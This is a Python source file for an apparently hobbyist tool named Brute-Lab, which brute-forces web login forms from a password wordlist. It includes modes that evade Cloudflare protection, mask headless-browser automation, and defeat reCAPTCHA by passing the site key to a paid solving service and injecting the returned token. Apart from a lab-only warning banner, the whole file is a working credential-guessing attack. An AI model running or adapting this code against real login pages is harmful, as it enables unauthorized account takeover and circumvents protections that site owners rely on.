#!/usr/bin/env python3

import argparse
import requests
import cloudscraper
import time
import urllib3
import os
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, Style, init
from twocaptcha import TwoCaptcha  # CAPTCHA solver (2Captcha)

# Initialize colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Default headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

CAPTCHA_KEYWORDS = ["captcha", "verify", "recaptcha", "i'm not a robot"]

# === Auto-detect form fields ===
def detect_form_fields(url):
    try:
        res = requests.get(url, headers=HEADERS, verify=False, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print(Fore.RED + "[!] No form detected.")
            return None, None

        inputs = form.find_all('input')
        user_field = pass_field = None
        for input_tag in inputs:
            name = input_tag.get('name', '').lower()
            if 'user' in name:
                user_field = name
            elif 'pass' in name:
                pass_field = name

        return user_field, pass_field
    except Exception as e:
        print(Fore.RED + f"[!] Error detecting form fields: {e}")
        return None, None

# === BASIC Mode ===
def basic_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using BASIC mode (requests)")
    for i, password in enumerate(args.wordlist, 1):
        data = {user_field: args.username, pass_field: password}
        try:
            res = requests.post(args.url, data=data, headers=HEADERS, verify=False, timeout=10)
        except requests.RequestException as e:
            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
            continue

        print(Fore.YELLOW + f"[{i}] Trying: {password}")
        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
            print(Fore.RED + "[!] CAPTCHA detected. Skipping.")
            continue
        if "incorrect" not in res.text.lower():
            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
            return
        time.sleep(1)
    print(Fore.RED + "[-] Password not found.")

# === CLOUDFLARE Mode ===
def cloudscraper_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using CLOUDFLARE mode (cloudscraper)")
    scraper = cloudscraper.create_scraper()
    for i, password in enumerate(args.wordlist, 1):
        data = {user_field: args.username, pass_field: password}
        try:
            res = scraper.post(args.url, data=data, headers=HEADERS, timeout=10)
        except Exception as e:
            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
            continue

        print(Fore.YELLOW + f"[{i}] Trying: {password}")
        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
            print(Fore.RED + "[!] CAPTCHA detected. Skipping.")
            continue
        if "incorrect" not in res.text.lower():
            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
            return
        time.sleep(1)
    print(Fore.RED + "[-] Password not found.")

# === BROWSER Mode with CAPTCHA Support ===
def selenium_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using BROWSER mode (selenium)")

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")

    try:
        service = ChromeService(executable_path=ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
    except Exception as e:
        print(Fore.RED + f"[!] Selenium error: {e}")
        return

    for i, password in enumerate(args.wordlist, 1):
        try:
            driver.get(args.url)
            time.sleep(2)

            user_input = driver.find_element(By.NAME, user_field)
            pass_input = driver.find_element(By.NAME, pass_field)
            submit = driver.find_element(By.XPATH, '//button[@type="submit"]')

            user_input.clear()
            pass_input.clear()
            user_input.send_keys(args.username)
            pass_input.send_keys(password)
            submit.click()

            time.sleep(2)
            page_text = driver.page_source.lower()
            print(Fore.YELLOW + f"[{i}] Trying: {password}")

            if any(k in page_text for k in CAPTCHA_KEYWORDS):
                print(Fore.YELLOW + "[!] CAPTCHA detected.")

                if args.captcha_api:
                    print(Fore.CYAN + "[*] Attempting CAPTCHA bypass via 2Captcha...")

                    solver = TwoCaptcha(args.captcha_api)

                    site_key = None
                    for iframe in driver.find_elements(By.TAG_NAME, 'iframe'):
                        src = iframe.get_attribute('src')
                        if 'recaptcha' in src and 'k=' in src:
                            site_key = src.split('k=')[1].split('&')[0]
                            break

                    if not site_key:
                        print(Fore.RED + "[!] CAPTCHA sitekey not found.")
                        continue

                    try:
                        result = solver.recaptcha(sitekey=site_key, url=args.url)
                        token = result['code']

                        driver.execute_script("""
                            document.getElementById("g-recaptcha-response").style.display = "block";
                            document.getElementById("g-recaptcha-response").value = arguments[0];
                        """, token)

                        print(Fore.GREEN + "[+] CAPTCHA solved and token injected.")
                        submit.click()
                        time.sleep(2)
                        page_text = driver.page_source.lower()

                    except Exception as e:
                        print(Fore.RED + f"[!] CAPTCHA solving failed: {e}")
                        continue
                else:
                    print(Fore.RED + "[!] Skipping CAPTCHA as no API key was provided.")
                    continue

            if "incorrect" not in page_text:
                print(Fore.GREEN + f"[✅] Password FOUND: {password}")
                driver.quit()
                return

        except Exception as e:
            print(Fore.RED + f"[!] Selenium error on attempt {i}: {e}")
            continue

    driver.quit()
    print(Fore.RED + "[-] Password not found.")

# === CLI Entry Point ===
def main():
    print(Fore.GREEN + """
==============================================
 Brute-Lab - Brute-force Login Testing Tool
 Author: De Nafman
 Version: 1.0
==============================================

[!] WARNING: This tool is intended for use ONLY in controlled environments such as penetration testing labs WITH legal authorization. 
Unauthorized use may violate laws and ethical standards.
""")
    
    user_input = input(Fore.YELLOW + "Press [Enter] to continue or [Q] to quit: ")
    if user_input.strip().lower() == "q":
        print(Fore.RED + "[!] Exiting...")
        exit()

    print(Fore.GREEN + """
Usage Information:

Modes:
  basic      → Simple POST requests
  cloudflare → Uses cloudscraper to bypass Cloudflare
  browser    → Full browser emulation via Selenium (supports CAPTCHA)

Examples:
  python Brute_lab.py http://example.com/login admin passlist.txt
  python Brute_lab.py http://example.com/login admin passlist.txt --mode cloudflare
  python Brute_lab.py http://example.com/login admin passlist.txt --mode browser --captcha-api YOUR_2CAPTCHA_API_KEY

Note:
- CAPTCHA bypass works only with reCAPTCHA v2.
- ChromeDriver is auto-managed via webdriver-manager.
""")

    parser = argparse.ArgumentParser(
        description="Brute-force login CLI tool for ethical hacking labs\nAuthor: De Nafman",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("url", help="Target login URL")
    parser.add_argument("username", help="Username to brute-force")
    parser.add_argument("passwords", help="Path to password file")
    parser.add_argument("-m", "--mode", choices=["basic", "cloudflare", "browser"], default="basic",
                        help="Select brute-force mode")
    parser.add_argument("--captcha-api", help="2Captcha API key (for browser mode CAPTCHA solving)")
    parser.add_argument("-d", "--driver", default="chromedriver", help="ChromeDriver path (not required with webdriver-manager)")

    args = parser.parse_args()

    if not os.path.exists(args.passwords):
        print(Fore.RED + "[!] Password file not found.")
        return

    with open(args.passwords, "r", encoding="utf-8", errors="ignore") as f:
        args.wordlist = f.read().splitlines()

    user_field, pass_field = detect_form_fields(args.url)
    if not user_field or not pass_field:
        print(Fore.RED + "[!] Could not auto-detect form fields.")
        user_field = input("Enter username field name: ")
        pass_field = input("Enter password field name: ")

    print(Fore.CYAN + f"[*] Using fields: username='{user_field}', password='{pass_field}'")

    if args.mode == "basic":
        basic_mode(args, user_field, pass_field)
    elif args.mode == "cloudflare":
        cloudscraper_mode(args, user_field, pass_field)
    elif args.mode == "browser":
        selenium_mode(args, user_field, pass_field)

if __name__ == "__main__":
    main()
